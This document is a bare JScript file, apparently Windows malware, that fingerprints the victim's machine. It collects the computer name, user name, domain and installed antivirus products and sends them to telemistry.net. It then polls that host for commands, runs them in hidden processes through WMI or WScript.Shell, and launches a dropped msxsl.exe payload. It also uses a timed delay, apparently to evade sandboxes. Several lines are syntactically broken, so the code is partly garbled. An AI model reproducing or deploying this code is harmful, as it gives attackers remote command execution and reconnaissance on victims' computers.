function main() {
    var i = 0;
    var lock = false;
    var r = "";
    var wsobj = loadobj("WScript.Shell");
    var appdata_path = wsobj.ExpandEnvironmentStrings("%appdata%");
    var path_pay = appdata_path + "\Microsoft\HBIDJJCS0NHUZM3EG.txt";
    var path_per = appdata_path + "\Microsoft\HSXBJ2VCKMCMLL7I3PD4CC.txt";
    var path_load = appdata_path + "\Microsoft\msxsl.exe";
    var msx_obj;
    var msx_obj;
    try {
        msx_obj = loadobj("MSXML2.ServerXMLHTTP");
    } catch (e) {
        try {
            msx_obj = loadobj("Msxml2.XMLHTTP.6.0"));
    } catch (e) {
        try {
            msx_obj = loadobj("Msxml2.XMLHTTP.3.0");
        } catch (e2) {
            msx_obj = loadobj("Microsoft.XMLHTTP");
        }
    }
}
if (existfile(path_per)) {
    r = ReadFile(path_per);
} else {
    var AV = listAV();
    r = collectvict();
    lock = true;
}
wait_time(lock);

function wait_time(lock) {
    if (i >= 120 || lock) {
        var b = '"' + path_load + '"' + " " + '"' + path_pay + '"' + " " + '"' + path_pay + '"';
        var j = exec_code(b, 0);
        if (!j) {
            wait_time(false);
        }
    } else {
        i += 1;
        var datapay = getcommand(r);
        if (datapay != "") {
            exec_code(datapay, 0);
        }
        checkdebug(2);
    }
}

function getcommand(r) {
    try {
        msx_obj.open("GET", "https://telemistry.net/get.php?id=" + r, false);
        msx_obj.send();
        return msx_obj.responseText;
    } catch (c) {
        return "";
    }
}

function exec_code(arg1, arg2) {
    try {
        var wb1obj = loadobj("WbemScripting.SWbemLocator");
        var wmiobj = wb1obj.ConnectServer(".", "root\cimv2");
        var p = wmiobj.Get("Win32_ProcessStartup").SpawnInstance_();
        p.ShowWindow = 0;
        var pr = wmiobj.Get("Win32_Process");
        var argp = pr.Methods_("Create").inParameters.SpawnInstance_();
        argp.Properties_.Item("CommandLine").Value = arg1;
        argp.Properties_.Item("ProcessStartupInformation").Value = p;
        var p1 = wmiobj.ExecMethod("Win32_Process", "Create", argp);
        if (p1.ReturnValue !== 0) {
            return execShell(arg1, arg2);
        }
        if (arg2 == 1) {
            var cPid = p1.ProcessId;
            var t;
            var x = wmiobj.ExecNotificationQuery("SELECT * FROM __InstanceDeletionEvent Within 1 Where TargetInstance ISA 'Win32_Process'");
                while (true) {
                    t = x.nextEvent();
                    if (t.TargetInstance.ProcessID == cPid) {
                        break;
                    }
                }
            }
            return true;
        } catch (gKjURcJoo5004) {
            return execShell(arg1, arg2);
        }
    }

    function checkdebug(arg1) {
        var l;
        if (!arg1) {
            return false;
        }
        var d = arg1 * 60;
        var time = d.toString();
        try {
            l = exec_code("typeperf.exe '\System\Processor Queue Length' -si " + time + ' - sc 1 ', 1);
                    if (l == true) {
                        wait_time(false);
                    } else {
                        wait_time(false);
                    }
                }
                catch (ewmi) {
                    wait_time(false);
                }
            }

            function execShell(arg1, arg2) {
                var wsobj3;
                var a;
                try {
                    wsobj3 = loadobj("WScript.Shell");
                    if (arg2 == 1) {
                        a = 1;
                    } else {
                        a = 0;
                    }
                    if (!a) {
                        a = 0;
                    }
                    wsobj3.Run(arg1, 0, a);
                    return true;
                } catch (gKjURcJoo5003) {
                    return false;
                }
            }

            function collectvict() {
                try {
                    wsobj2 = loadobj("WScript.Shell");
                    var computername = wsobj2.ExpandEnvironmentStrings("%computername%");
                    var username = wsobj2.ExpandEnvironmentStrings("%USERNAME%");
                    var userdomain = wsobj2.ExpandEnvironmentStrings("%userdomain%");
                    var req = "";
                    var pulse = computername + "|" + username + "|" + userdomain + "|" + AV;
                    do {
                        msx_obj.open("GET", "https://telemistry.net/reg.php?g=" + pulse, false);
                        msx_obj.send();
                        req = msx_obj.responseText;
                    } while (req == "");
                    senddatatofile(path_per, req);
                    return req;
                } catch (gKjURcJoo500) {
                    return 0;
                }
            }

            function senddatatofile(path, path) {
                wso = loadobj("Scripting.FileSystemObject");
                f = wso.CreateTextFile(path, 2);
                f.Write(path);
                f.Close();
            }

            function loadobj(xString) {
                return new ActiveXObject(xString);
            }

            function ReadFile(path) {
                wso = loadobj("Scripting.FileSystemObject"));
                fi = wso.OpenTextFile(path, 1);
                d = fi.ReadAll();
                fi.Close();
                return d;
            }

            function existfile(path) {
                var f;
                try {
                    f = loadobj("Scripting.FileSystemObject");
                    if (f.FileExists(path)) {
                        return true;
                    } else {
                        return false;
                    }
                } catch (gKjURcJoo500) {
                    return false;
                }
            }

            function listAV() {
                try {
                    var res = "";
                    var wso2 = loadobj("WbemScripting.SWbemLocator");
                    var av = wso2.ConnectServer(".", "root\SecurityCenter2");
                    var AVtest = av.ExecQuery("SELECT * FROM AntivirusProduct");
                    var em = new Enumerator(AVtest);
                    while (em.atEnd() === false) {
                        list = em.item();
                        res += list.displayName + ' ';
                        em.moveNext();
                    }
                    var wso2 = loadobj("WbemScripting.SWbemLocator");
                    var av = wso2.ConnectServer(".", "root\SecurityCenter");
                    var AVtest = av.ExecQuery("SELECT * FROM AntivirusProduct");
                    var em = new Enumerator(AVtest);
                    while (em.atEnd() === false) {
                        list = em.item();
                        res += list.displayName + ' ';
                        em.moveNext();
                    }
                    return res;
                } catch (dpxaxpaxadaida) {
                    return "";
                }
            }
        }
main();
